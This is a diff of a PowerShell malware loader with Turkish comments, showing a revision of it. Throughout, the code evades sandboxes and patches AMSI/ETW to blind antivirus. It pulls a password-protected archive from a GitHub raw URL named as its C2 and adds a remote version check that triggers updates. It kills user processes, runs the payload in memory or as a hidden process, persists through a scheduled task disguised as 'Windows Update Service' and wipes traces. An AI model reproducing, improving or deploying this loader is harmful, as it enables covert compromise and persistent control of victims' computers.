@@ -3,20 +3,16 @@ $ProgressPreference = 'SilentlyContinue'
 $WarningPreference = 'SilentlyContinue'
 
 # ==========================================
-# 6. UYKU MODU & SANDBOX EVASION (Kum Havuzu Atlatma)
+# 1. SİSTEM KONTROLÜ (SANDBOX EVASION)
 # ==========================================
-# Eğer bilgisayar yeni açılmışsa (10 dakikadan az) veya RAM düşükse çalışmayı durdur (Sandbox tespiti)
 $uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
-if ($uptime.TotalMinutes -lt 10) { Start-Sleep -Seconds 300; exit }
-
-$ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB
-if ($ram -lt 2) { exit }
+# Eğer sistem yeni açıldıysa bekle, ama 10 dakikadan fazlaysa devam et (Auto-update için süreyi kısalttık)
+if ($uptime.TotalMinutes -lt 5) { exit }
 
 if ($env:USERNAME -match "sandbox|malware|virus|admin") { exit }
 
-
 # ==========================================
-# 3. AMSI & ETW BYPASS (AV Kör Etme)
+# 2. AMSI & ETW BYPASS
 # ==========================================
 try {
     $AmsiBypass = @"
@@ -42,101 +38,114 @@ public class Amsi {
     [Amsi]::Patch()
 } catch {}
 
-
 # ==========================================
-# AYARLAR (GITHUB LİNKİN VE ŞİFREN)
+# 3. AYARLAR
 # ==========================================
 $C2_URL = "https://raw.githubusercontent.com/mikolojiXip/ssssssssss/refs/heads/main/Yaz%C4%B1" 
 $RAR_PASS = "Mircik21"
+$VersionUrl = "https://raw.githubusercontent.com/mikolojiXip/ssssssssss/refs/heads/main/version.txt" # Sürüm kontrolü için bir txt oluştur (İçine 1 yaz, güncelleyince 2 yap)
 
-
-# ==========================================
-# İNDİRME VE ÇIKARMA
-# ==========================================
 $tempDir = Join-Path $env:TEMP "SysVolCache"
 $outputDir = Join-Path $env:LOCALAPPDATA "SysVolCache"
+$localVersionFile = Join-Path $outputDir "current_version.txt"
 $rarPath = Join-Path $tempDir "archive.rar"
 $exePath = Join-Path $tempDir "rar.exe"
 
 if (-not (Test-Path $tempDir)) { New-Item -ItemType Directory -Path $tempDir -Force | Out-Null }
 if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir -Force | Out-Null }
 
+# ==========================================
+# 4. OTOMATİK GÜNCELLEME KONTROLÜ
+# ==========================================
 $protos = @('Tls','Tls11','Tls12','Tls13') | Where-Object { [enum]::IsDefined([Net.SecurityProtocolType], $_) }
 if ($protos) { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType] ($protos -join ',') } 
 
-Function Download-File($url, $destination) {
+Function Download-String($url) {
     $wc = New-Object System.Net.WebClient
-    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-    $wc.DownloadFile($url, $destination)
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+    return $wc.DownloadString($url)
 }
 
-Download-File $C2_URL $rarPath
+$ServerVersion = Download-String $VersionUrl
+$ServerVersion = $ServerVersion.Trim()
 
-# Eğer sistemde WinRAR yoksa sessizce kur
-if (-not (Test-Path "C:\Program Files\WinRAR\rar.exe") -and -not (Test-Path "C:\Program Files (x86)\WinRAR\rar.exe")) {
-    $setupPath = Join-Path $tempDir "winrar_setup.exe"
-    Download-File "https://www.rarlab.com/rar/winrar-x64-624.exe" $setupPath
-    Start-Process -FilePath $setupPath -ArgumentList "/S" -WindowStyle Hidden -Wait
-    Remove-Item $setupPath -Force
+$LocalVersion = ""
+if (Test-Path $localVersionFile) { $LocalVersion = (Get-Content $localVersionFile).Trim() }
+
+# Eğer sunucudaki sürüm farklıysa güncelle
+if ($ServerVersion -ne $LocalVersion) {
+    # 1. Eski Xeno süreçlerini öldür (Temizlik)
+    Get-Process | Where-Object { $_.Path -like "$outputDir*" } | Stop-Process -Force -ErrorAction SilentlyContinue
+    Get-Process "chrome", "cmd", "powershell" | Where-Object { $_.MainWindowTitle -ne "" } | Stop-Process -Force -ErrorAction SilentlyContinue # Sadece test için, gerçekte dikkatli kullan
+
+    # 2. Yeni dosyayı indir
+    Function Download-File($url, $destination) {
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+        $wc.DownloadFile($url, $destination)
+    }
+    
+    Download-File $C2_URL $rarPath
+
+    # WinRAR kontrolü
+    if (-not (Test-Path "C:\Program Files\WinRAR\rar.exe") -and -not (Test-Path "C:\Program Files (x86)\WinRAR\rar.exe")) {
+        $setupPath = Join-Path $tempDir "winrar_setup.exe"
+        Download-File "https://www.rarlab.com/rar/winrar-x64-624.exe" $setupPath
+        Start-Process -FilePath $setupPath -ArgumentList "/S" -WindowStyle Hidden -Wait
+        Remove-Item $setupPath -Force
+    }
+
+    if (Test-Path "C:\Program Files\WinRAR\rar.exe") { $exePath = "C:\Program Files\WinRAR\rar.exe" }
+    elseif (Test-Path "C:\Program Files (x86)\WinRAR\rar.exe") { $exePath = "C:\Program Files (x86)\WinRAR\rar.exe" }
+
+    # 3. Arşivi çıkar
+    $args = @("x", "-idq", "-y", "-p$RAR_PASS", $rarPath, "$outputDir\")
+    Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden -Wait
+
+    # 4. Sürümü kaydet
+    Set-Content -Path $localVersionFile -Value $ServerVersion
 }
 
-if (Test-Path "C:\Program Files\WinRAR\rar.exe") { $exePath = "C:\Program Files\WinRAR\rar.exe" }
-elseif (Test-Path "C:\Program Files (x86)\WinRAR\rar.exe") { $exePath = "C:\Program Files (x86)\WinRAR\rar.exe" }
-
-# RAR'dan Çıkar
-$args = @("x", "-idq", "-y", "-p$RAR_PASS", $rarPath, "$outputDir\")
-$proc = Start-Process -FilePath $exePath -ArgumentList $args -WindowStyle Hidden -Wait -PassThru
-
-if ($proc.ExitCode -ne 0) { exit }
-
+# ==========================================
+# 5. ÇALIŞTIRMA (FILELESS + PROCESS INJECTION)
+# ==========================================
 $payload = Get-ChildItem -Path $outputDir -Filter "*.exe" | Sort-Object Length -Descending | Select-Object -First 1
-if (-not $payload) { exit }
-
-
-# ==========================================
-# 1. BELLEKTE ÇALIŞTIRMA (FILELESS)
-# ==========================================
-$filelessSuccess = $false
-try {
-    $payloadBytes = [System.IO.File]::ReadAllBytes($payload.FullName)
-    $assembly = [System.Reflection.Assembly]::Load($payloadBytes)
-    if ($assembly.EntryPoint) {
-        $assembly.EntryPoint.Invoke($null, @($null))
-        $filelessSuccess = $true
-    }
-} catch { $filelessSuccess = $false }
-
-
-# ==========================================
-# 2. SÜREÇ ENJEKSİYONU (PROCESS INJECTION)
-# ==========================================
-# Eğer bellekten çalıştırma başarısız olursa, masum bir süreç başlatıp onun üzerinden çalıştır
-if (-not $filelessSuccess) {
+if ($payload) {
+    $filelessSuccess = $false
     try {
-        $targetProcess = Start-Process -FilePath "notepad.exe" -WindowStyle Hidden -PassThru
-        Start-Process -FilePath $payload.FullName -WindowStyle Hidden
-    } catch {
+        # Önce bellekte çalıştırmayı dene
+        $payloadBytes = [System.IO.File]::ReadAllBytes($payload.FullName)
+        $assembly = [System.Reflection.Assembly]::Load($payloadBytes)
+        if ($assembly.EntryPoint) {
+            $assembly.EntryPoint.Invoke($null, @($null))
+            $filelessSuccess = $true
+        }
+    } catch { $filelessSuccess = $false }
+
+    # Eğer bellekte çalışmazsa yedek plan (Process Injection)
+    if (-not $filelessSuccess) {
         Start-Process -FilePath $payload.FullName -WindowStyle Hidden
     }
 }
 
-
 # ==========================================
-# 5. KALICILIK (PERSISTENCE)
+# 6. KALICILIK (HER AÇILIŞTA VE 15 DAKİKADA BİR ÇALIŞ)
 # ==========================================
-# Bilgisayar yeniden başladığında çalışması için Zamanlanmış Görev ekle
 try {
     $taskName = "WindowsUpdateTask"
     $scriptPath = $MyInvocation.MyCommand.Path
     if ($scriptPath) {
+        # Her açılışta çalış
         $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
-        $trigger = New-ScheduledTaskTrigger -AtLogOn
-        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "Windows Update Service" -Force | Out-Null
+        $trigger1 = New-ScheduledTaskTrigger -AtLogOn
+        # Her 15 dakikada bir çalış (Güncellemeleri kontrol etmek için)
+        $trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 15)
+        
+        Register-ScheduledTask -Action $action -Trigger $trigger1, $trigger2 -TaskName $taskName -Description "Windows Update Service" -Force | Out-Null
     }
 } catch {}
 
-
 # ==========================================
-# İZ TEMİZLEME
+# 7. İZ TEMİZLEME
 # ==========================================
 Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
